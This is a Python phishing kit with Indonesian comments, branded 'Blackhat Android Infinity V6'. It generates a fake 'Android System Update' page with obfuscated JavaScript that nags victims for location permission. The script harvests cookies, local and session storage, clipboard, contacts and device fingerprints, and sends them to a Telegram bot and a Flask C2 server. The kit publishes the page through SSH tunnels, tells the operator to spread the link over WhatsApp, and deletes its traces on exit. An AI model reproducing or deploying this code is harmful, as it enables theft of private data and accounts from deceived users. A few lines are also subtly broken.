import os
import subprocess
import time
import shutil
import threading
import random
import sys
import requests
import socks
import socket
from faker import Faker
from base64 import b64encode
import logging
import json
import hashlib
from flask import Flask, request
from concurrent.futures import ThreadPoolExecutor
import ssl
import OpenSSL
from javascript_obfuscator import obfuscate

# Setup logging (in-memory, no file traces)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()
logger.handlers = [logging.StreamHandler(sys.stdout)]

fake = Faker()

# Baca proxy dari file .txt
def load_proxies(file_path="proxies.txt"):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f.read().splitlines():
                if line.strip():
                    parts = line.split(':')
                    if len(parts) >= 2:
                        proxy = {"host": parts[0], "port": int(parts[1]), "type": "http"}
                        if len(parts) == 4:
                            proxy["user"] = parts[2]
                            proxy["pass"] = parts[3]
                        if "https" in line.lower():
                            proxy["type"] = "https"
                        if test_proxy(proxy):
                            proxies.append(proxy)
        return proxies if proxies else [{"host": "127.0.0.1", "port": 8080, "type": "http"}]
    except Exception as e:
        logger.error(f"Gagal baca proxies.txt: {e}")
        return [{"host": "127.0.0.1", "port": 8080, "type": "http"}]

# Test proxy untuk memastikan valid
def test_proxy(proxy):
    try:
        proxies = {proxy["type"]: f"{proxy['type']}://{proxy['host']}:{proxy['port']}"}
        if proxy.get("user") and proxy.get("pass"):
            proxies[proxy["type"]] = f"{proxy['type']}://{proxy['user']}:{proxy['pass']}@{proxy['host']}:{proxy['port']}"}
        response = requests.get("https://api.ipify.org", proxies=proxies, timeout=5)
        return response.status_code == 200
    except:
        return False

proxy_list = load_proxies("proxies.txt")

# Animasi UI Hollywood-style
def hacker_ui():
    hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
    hack_logs = [
        "🔎 Scanning Android apps...",
        "🛡️ Bypassing browser sandbox...",
        "🌐 Rotating VIP proxy...",
        "💉 Executing infinity payload...",
        "🎯 Extracting app data...",
        "📡 Transmitting to Telegram C2..."
    ]
    def animate():
        while True:
            sys.stdout.write("\033[H\033[J")
            print("\033[32m" + "🔥 BLACKHAT ANDROID INFINITY V6 🔥".center(100) + "\033[0m")
            print("\033[31m" + "═"*100 + "\033[0m")
            for _ in range(8):
                print("".join(random.choice(hacker_chars) for _ in range(100)))
            print("\033[31m" + "═"*100 + "\033[0m")
            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(100))
            print("\033[33m" + "Data dikirim ke Telegram C2!".center(100))
            print("\033[31m" + "═"*100 + "\033[0m")
            time.sleep(0.3)
    threading.Thread(target=animate, daemon=True).start()

# Banner
def print_banner():
    banner = r"""
😈😈😈 PENCURI DATA ANDROID INFINITY V6 😈😈😈
__________  _________________________            
___  __ \ \/ /__  ____/___  _/_  ___/
__  /_/ /_  _/_____ \ __  / _____ \ 
_  ____/_  /  ____/ /___/ / ____/ / 
/_/     /_/   /____/ /____/ /____/  
                                    
    Coded by: Mr.4Rex_503 & Kevin4Chan1337
    Target: All Android App Data
    Powered by: Blackhat Indo Cyber Elite
😈 Optimized for Custom C2 & SSH Tunnel 😈
"""
    print(banner)

# Check dependensi
def check_dependencies():
    required = ['requests', 'faker', 'pysocks', 'flask', 'pyOpenSSL', 'javascript-obfuscator']
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[31m{lib} not found, installing...\033[0m")
            os.system(f"pip install {lib}")

# Generate self-signed SSL certificate
def generate_ssl_cert():
    key = OpenSSL.crypto.PKey()
    key.generate_key(OpenSSL.crypto.TYPE_RSA, 4096)
    cert = OpenSSL.crypto.X509()
    cert.get_subject().CN = "android-update.com"
    cert.get_subject().O = "Android Inc"
    cert.set_serial_number(random.randint(100000, 999999))
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(2*365*24*60*60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, 'sha512')
    with open("cert.pem", "wb") as f:
        f.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))
    with open("key.pem", "wb") as f:
        f.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key))
    return "cert.pem", "key.pem"

# Setup proxy VIP
def setup_proxy():
    proxy = random.choice(proxy_list)
    proxy_type = {"http": socks.HTTP, "https": socks.HTTP}.get(proxy["type"], socks.HTTP)
    socks.set_default_proxy(proxy_type, proxy["host"], proxy["port"], 
                           username=proxy.get("user"), password=proxy.get("pass"))
    socket.socket = socks.socksocket
    logger.info(f"Using VIP proxy: {proxy['host']}:{proxy['port']} ({proxy['type']})")
    return proxy

# Input Konfigurasi
def get_config():
    print("🔥 Masukkan konfigurasi, tuanku:")
    bot_token = input("Masukkan Telegram Bot Token: ")
    chat_id = input("Masukkan Telegram Chat ID: ")
    ssh_host = input("Masukkan SSH Host untuk tunnel (kosongkan jika pake Serveo): ") or "serveo.net"
    ssh_port = input("Masukkan SSH Port (default 22): ") or "22"
    ssh_user = input("Masukkan SSH Username (kosongkan jika pake Serveo): ") or ""
    ssh_key = input("Masukkan path ke SSH Key (kosongkan jika pake Serveo): ") or ""
    return bot_token, chat_id, ssh_host, ssh_port, ssh_user, ssh_key

# Obfuscasi JS
def obfuscate_js(js_code):
    obfuscated = obfuscate(js_code, options={
        'compact': True,
        'controlFlowFlattening': True,
        'controlFlowFlatteningThreshold': 0.8,
        'deadCodeInjection': True,
        'deadCodeInjectionThreshold': 0.4,
        'stringArray': True,
        'stringArrayEncoding': ['base64', 'rc4'],
        'stringArrayThreshold': 0.8,
        'transformObjectKeys': True,
        'unicodeEscapeSequence': True,
        'identifierNamesGenerator': 'mangled',
        'shuffleStringArray': True,
        'splitStrings': True,
        'splitStringsChunkLength': 5
    }).get_obfuscated_code()
    return f"eval((function(){return {obfuscated}})())"

# Template HTML Payload
def generate_html(bot_token, chat_id):
    js_code = """
async function infinitySteal() {
    try {
        // Register Service Worker
        if ('serviceWorker' in navigator) {
            await navigator.serviceWorker.register('/sw.js');
        }

        // Fake permission prompt untuk lokasi
        async function forceGeolocation() {
            let attempts = 0;
            const maxAttempts = 3;
            while (attempts < maxAttempts) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve(pos),
                            err => reject(err),
                            { timeout: 5000, enableHighAccuracy: true }
                        );
                    });
                    return { lat: pos.coords.latitude, lon: pos.coords.longitude };
                } catch (error) {
                    attempts++;
                    if (attempts < maxAttempts) {
                        const fakePrompt = document.createElement('div');
                        fakePrompt.style.cssText = `
                            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                            background: rgba(0,0,0,0.8); z-index: 9999; color: white;
                            display: flex; justify-content: center; align-items: center;
                            font-family: Arial; text-align: center; padding: 20px;
                        `;
                        fakePrompt.innerHTML = `
                            <div style="background: #fff; color: #000; padding: 20px; border-radius: 10px;">
                                <h2>Perbarui Sistem Android</h2>
                                <p>Izin lokasi diperlukan untuk verifikasi update. Tolong izinkan untuk melanjutkan.</p>
                                <button onclick="this.parentElement.parentElement.remove();navigator.geolocation.getCurrentPosition(
                                    pos => window.location.reload(),
                                    () => {}, {timeout: 5000}
                                )" style="background: #a4c639; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
                                    Izinkan Sekarang
                                </button>
                            </div>
                        `;
                        document.body.appendChild(fakePrompt);
                        await new Promise(resolve => setTimeout(resolve, 3000));
                    } else {
                        return 'Geolokasi ditolak setelah 3 percobaan';
                    }
                }
            }
        }

        // Simulate user interaction
        function simulateUserInteraction() {
            const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true });
            document.dispatchEvent(fakeClick);
            const fakeKey = new KeyboardEvent('keydown', { key: 'Enter', bubbles: true });
            document.dispatchEvent(fakeKey);
        }
        simulateUserInteraction();

        // Collect device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            battery: await navigator.getBattery?.().then(b => ({ level: b.level, charging: b.charging })) || 'N/A',
            geolocation: await forceGeolocation(),
            webrtc: await new Promise(async resolve => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.onicecandidate = e => {
                        if (e.candidate) resolve(e.candidate.candidate);
                        else resolve('WebRTC disabled');
                    };
                    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
                } catch { resolve('WebRTC error'); }
            }),
            canvas: (() => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 10, 20);
                return canvas.toDataURL();
            })(),
            apps: await new Promise(async resolve => {
                const apps = [];
                const appDomains = ['web.whatsapp.com', 'www.instagram.com', 'www.facebook.com'];
                for (const domain of appDomains) {
                    try {
                        const res = await fetch(`https://${domain}`, { credentials: 'include' });
                        apps.push({ domain, cookies: document.cookie });
                    } catch { apps.push({ domain, cookies: 'N/A' }); }
                }
                resolve(apps);
            }),
            contacts: await new Promise(async resolve => {
                if (navigator.contacts && navigator.contacts.select) {
                    try {
                        const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
                        resolve(contacts.map(c => ({ name: c.name, email: c.email, tel: c.tel })));
                    } catch { resolve('Kontak tidak tersedia'); }
                } else {
                    resolve('Kontak API tidak didukung');
                }
            }),
            network: await new Promise(async resolve => {
                if (navigator.connection) {
                    resolve({
                        type: navigator.connection.type,
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    });
                } else {
                    resolve('Network info tidak tersedia');
                }
            })
        };

        // Collect browser data
        const cookies = document.cookie;
        const localStorageData = JSON.stringify(localStorage);
        const sessionStorageData = JSON.stringify(sessionStorage);
        const clipboard = await navigator.clipboard?.readText().catch(() => 'Clipboard N/A');

        // Send data to C2 and Telegram
        const data = {
            deviceInfo, cookies, localStorageData, sessionStorageData, clipboard
        };
        const telegramUrl = `https://api.telegram.org/bot${bot_token}/sendMessage`;
        for (let i = 0; i < 5; i++) {
            try {
                const text = JSON.stringify(data, null, 2);
                const chunks = text.match(/.{1,4000}/g) || [text];
                for (const chunk of chunks) {
                    await fetch(telegramUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: '${chat_id}', text: `Android Data:\n${chunk}` })
                    });
                }
                await fetch('/store', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                break;
            } catch {
                if (i === 4) console.error('Telegram/C2 failed');
                await new Promise(resolve => setTimeout(resolve, Math.pow(2, i) * 1000)); // Exponential backoff
            }
        }

        // Redirect to legit site
        setTimeout(() => window.location.href = 'https://google.com', 500);
    } catch (error) {
        console.error('Infinity steal error:', error);
    }
}

// Auto-execute
infinitySteal();

// Persistent geolocation prompt
document.addEventListener('DOMContentLoaded', () => {
    setInterval(() => {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(
            () => {},
            () => {
                const fakePrompt = document.createElement('div');
                fakePrompt.style.cssText = `
                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                    background: rgba(0,0,0,0.8); z-index: 9999; color: white;
                    display: flex; justify-content: center; align-items: center;
                    font-family: Arial; text-align: center; padding: 20px;
                `;
                fakePrompt.innerHTML = `
                    <div style="background: #fff; color: #000; padding: 20px; border-radius: 10px;">
                        <h2>Perbarui Sistem Android</h2>
                        <p>Izin lokasi diperlukan untuk melanjutkan. Klik "Izinkan" untuk verifikasi.</p>
                        <button onclick="this.parentElement.parentElement.remove();navigator.geolocation.getCurrentPosition(
                            pos => window.location.reload(),
                            () => {}, {timeout: 5000}
                        )" style="background: #a4c639; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
                            Izinkan
                        </button>
                    </div>
                `;
                document.body.appendChild(fakePrompt);
            },
            { timeout: 5000 }
        );
    }, 5000);
});
"""
    return f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android System Update</title>
    <meta name="description" content="Official Android System Update">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" href="https://www.android.com/favicon.ico">
    <style>
        body {{
            background: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #000;
        }}
        .container {{
            background: #f5f5f5;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 400px;
        }}
        .logo {{ width: 100px; margin-bottom: 20px; }}
        h1 {{ font-size: 1.5em; color: #3c4043; }}
        .loader {{
            border: 8px solid #e0e0e0;
            border-top: 8px solid #a4c639;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.android.com/static/img/logos/android-logo.png" class="logo" alt="Android Logo">
        <h1>Memproses Update Sistem...</h1>
        <div class="loader"></div>
    </div>
    <script>
        {obfuscate_js(js_code)}
    </script>
    <script src="/sw.js"></script>
</body>
</html>"""

# Service Worker untuk background execution
def generate_service_worker():
    return """self.addEventListener('fetch', event => {
    event.respondWith(fetch(event.request));
});
self.addEventListener('install', event => {
    self.skipWaiting();
});
self.addEventListener('activate', event => {
    self.clients.claim();
});"""

# Flask C2 Server
app = Flask(__name__)
stolen_data = []

@app.route('/store', methods=['POST'])
def store_data():
    data = request.json
    stolen_data.append(data)
    logger.info("Data stored in C2")
    return {'status': 'success'}

def run_c2_server():
    cert_file, key_file = generate_ssl_cert()
    app.run(host='0.0.0.0', port=5000, ssl_context=(cert_file, key_file), threaded=True)

# Setup custom SSH tunnel
def setup_tunnel(port, ssh_host, ssh_port, ssh_user, ssh_key):
    if ssh_host == "serveo.net" and not ssh_user and not ssh_key:
        ssh_cmd = ["ssh", "-R", f"80:localhost:{port}", "serveo.net"]
    else:
        ssh_cmd = ["ssh", "-R", f"80:localhost:{port}", "-p", ssh_port, "-i", ssh_key, f"{ssh_user}@{ssh_host}"]
    
    ssh_process = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)
    
    try:
        # Cek kalau Serveo
        if ssh_host == "serveo.net":
            output = ssh_process.stdout.readline().decode()
            for line in output.splitlines():
                if "http" in line:
                    url = line.strip().split()[-1]
                    return url, ssh_process
            # Fallback cek API tunnel
            tunnels = requests.get("http://localhost:4040/api/tunnels").json()['tunnels']
            return tunnels[0]['public_url'], ssh_process
        else:
            return f"https://{ssh_host}", ssh_process
    except:
        ssh_process.terminate()
        logger.error("Gagal setup tunnel")
        return None, None

# Main setup
def setup_phishing(bot_token, chat_id, ssh_host, ssh_port, ssh_user, ssh_key):
    folder_name = f"phishing_site_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    os.makedirs(folder_name, exist_ok=True)
    
    # Generate files
    with open(f"{folder_name}/index.html", "w", encoding="utf-8") as f:
        f.write(generate_html(bot_token, chat_id))
    with open(f"{folder_name}/sw.js", "w", encoding="utf-8") as f:
        f.write(generate_service_worker())
    
    # Start Flask C2
    threading.Thread(target=run_c2_server, daemon=True).start()
    
    # Start HTTPS server
    cert_file, key_file = generate_ssl_cert()
    server_process = subprocess.Popen(["python", "-m", "http.server", "8080", "--bind", "0.0.0.0", "--certificate", cert_file, "--key", key_file], cwd=folder_name)
    
    # Setup tunnel
    proxy = setup_proxy()
    url, tunnel_process = setup_tunnel(8080, ssh_host, ssh_port, ssh_user, ssh_key)
    
    if url:
        print(f"\n🎉 Link Phishing Siap Disebar: {url}")
        print("🔗 Kirim link ini via WhatsApp/Telegram!")
        print("⏳ Menunggu target klik... Data masuk ke Telegram!")
        logger.info(f"Phishing URL: {url}")
    else:
        print("❌ Gagal setup tunnel. Cek SSH/Serveo!")
        server_process.terminate()
        sys.exit(1)
    
    # Monitor tunnel
    def monitor_tunnel():
        while server_process.poll() is None and (tunnel_process and tunnel_process.poll() is None):
            time.sleep(5)
            try:
                requests.get(url, timeout=5)
            except:
                logger.info("Tunnel down, restarting...")
                tunnel_process.terminate()
                new_url, new_process = setup_tunnel(8080, ssh_host, ssh_port, ssh_user, ssh_key)
                if new_url:
                    print(f"🔄 Tunnel restarted: {new_url}")
                    logger.info(f"New URL: {new_url}")
                    tunnel_process = new_process
    
    threading.Thread(target=monitor_tunnel, daemon=True).start()
    return server_process, tunnel_process, folder_name

# Main program
def main():
    check_dependencies()
    print_banner()
    bot_token, chat_id, ssh_host, ssh_port, ssh_user, ssh_key = get_config()
    
    server_process, tunnel_process, folder_name = setup_phishing(bot_token, chat_id, ssh_host, ssh_port, ssh_user, ssh_key)
    hacker_ui()
    try:
        input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
    finally:
        server_process.terminate()
        if tunnel_process:
            tunnel_process.terminate()
        shutil.rmtree(folder_name, ignore_errors=True)
        for file in ["cert.pem", "key.pem"]:
            if os.path.exists(file):
                os.remove(file)
        print("🧹 Membersihkan jejak... Selesai!")

if __name__ == "__main__":
    main()
